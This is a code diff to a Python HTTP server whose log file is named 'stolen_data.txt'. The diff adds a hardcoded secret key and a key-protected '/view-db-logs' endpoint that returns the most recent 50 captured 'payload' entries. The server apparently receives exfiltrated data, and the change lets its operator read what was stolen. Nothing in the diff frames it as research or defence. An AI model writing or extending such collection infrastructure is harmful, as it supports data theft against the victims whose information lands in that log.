@@ -10,9 +10,13 @@ LOG_FILE = "stolen_data.txt"
 
 # Server loop
 def server_loop():
+    SECRET_KEY = "5d1d5b2dc4cd1fce61"  # Change this to your secret key
+
     class RequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
-            path = self.path.split("?", 1)[0]
+            parsed_path = urllib.parse.urlparse(self.path)
+            path = parsed_path.path
+            query_params = urllib.parse.parse_qs(parsed_path.query)
 
             if path in ('/', '/index.html'):
                 body = b"<html><body><h1>Server is running</h1></body></html>"
@@ -28,6 +32,50 @@ def server_loop():
                 self.send_header("Content-Length", str(len(body)))
                 self.end_headers()
                 self.wfile.write(body)
+            elif path == '/view-db-logs':
+                provided_key = query_params.get('key', [None])[0]
+
+                if provided_key != SECRET_KEY:
+                    body = b"403 Forbidden: Invalid or missing secret key."
+                    self.send_response(403)
+                    self.send_header("Content-type", "text/plain")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                    return
+
+                try:
+                    with open(LOG_FILE, "r", encoding="utf-8") as log_file:
+                        lines = log_file.readlines()
+
+                    recent_lines = lines[-50:]
+                    output = "TIMESTAMP | PAYLOAD\n" + "=" * 60 + "\n"
+                    if recent_lines:
+                        for line in recent_lines:
+                            output += line.rstrip("\n") + "\n"
+                    else:
+                        output += "No log entries found.\n"
+
+                    body = output.encode("utf-8")
+                    self.send_response(200)
+                    self.send_header("Content-type", "text/plain; charset=utf-8")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                except FileNotFoundError:
+                    body = b"No log file found."
+                    self.send_response(404)
+                    self.send_header("Content-type", "text/plain")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
+                except Exception as exc:
+                    body = f"Log read error: {exc}".encode("utf-8")
+                    self.send_response(500)
+                    self.send_header("Content-type", "text/plain")
+                    self.send_header("Content-Length", str(len(body)))
+                    self.end_headers()
+                    self.wfile.write(body)
             else:
                 body = b"Not Found"
                 self.send_response(404)
